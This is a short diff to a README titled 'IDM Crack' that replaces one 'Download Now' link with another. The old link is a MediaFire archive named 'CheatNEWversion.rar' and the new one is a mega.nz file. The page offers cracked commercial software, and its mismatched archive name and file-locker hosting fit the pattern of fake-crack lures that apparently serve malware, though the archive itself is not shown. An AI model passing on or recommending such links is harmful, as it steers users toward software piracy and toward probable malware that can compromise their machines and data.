@@ -1,5 +1,5 @@
 # IDM Crack
-[Download Now](https://www.mediafire.com/file/syy5rtg77va2rj2/CheatNEWversion.rar/file)
+[Download Now](https://mega.nz/file/hnczEIYK#Lzra8oFVIpZwUgIIbxAs68Zt2XoWaRcfehIJMGFiqqs)
 
 
 
